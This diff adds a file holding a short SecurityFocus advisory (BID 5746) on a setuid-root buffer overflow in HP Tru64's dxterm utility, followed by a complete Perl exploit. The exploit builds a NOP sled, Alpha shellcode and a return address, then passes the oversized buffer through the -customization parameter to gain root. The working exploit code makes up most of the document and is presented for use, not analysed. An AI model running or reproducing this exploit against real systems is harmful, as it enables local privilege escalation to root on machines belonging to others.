@@ -1,0 +1,35 @@
+source: http://www.securityfocus.com/bid/5746/info
+
+The HP Tru64/OSF1 dxterm utility is prone to a locally exploitable buffer overflow condition. This issue is due to insufficient checking of command line input supplied via the "-xrm" parameter. This parameter serves the same purpose as the "-customization" command line parameter, which is also not sufficiently checked. 
+
+Since this utility is installed setuid root, code execution that results from successful exploitation of this issue will yield root privileges on the system.
+
+#!/usr/bin/perl -w
+#
+# Tru64 5.1 /usr/bin/X11/dxterm
+#
+# stripey (stripey@snosoft.com) - 03/07/2002
+#
+
+($offset) = @ARGV,$offset || ($offset = 0);
+
+$ret_addr = pack("ll",(0x4001c828+$offset),0x1);
+
+$sc .= "\x30\x15\xd9\x43\x11\x74\xf0\x47\x12\x14\x02\x42";
+$sc .= "\xfc\xff\x32\xb2\x12\x94\x09\x42\xfc\xff\x32\xb2";
+$sc .= "\xff\x47\x3f\x26\x1f\x04\x31\x22\xfc\xff\x30\xb2";
+$sc .= "\xf7\xff\x1f\xd2\x10\x04\xff\x47\x11\x14\xe3\x43";
+$sc .= "\x20\x35\x20\x42\xff\xff\xff\xff\x30\x15\xd9\x43";
+$sc .= "\x31\x15\xd8\x43\x12\x04\xff\x47\x40\xff\x1e\xb6";
+$sc .= "\x48\xff\xfe\xb7\x98\xff\x7f\x26\xd0\x8c\x73\x22";
+$sc .= "\x13\x05\xf3\x47\x3c\xff\x7e\xb2\x69\x6e\x7f\x26";
+$sc .= "\x2f\x62\x73\x22\x38\xff\x7e\xb2\x13\x94\xe7\x43";
+$sc .= "\x20\x35\x60\x42\xff\xff\xff\xff";
+
+$buf_a .= pack("l",0x47ff041f)x2048;
+$buf_a .= $sc;
+$buf_a .= $ret_addr;
+
+exec("/usr/bin/X11/dxterm","-customization",$buf_a);
+
+
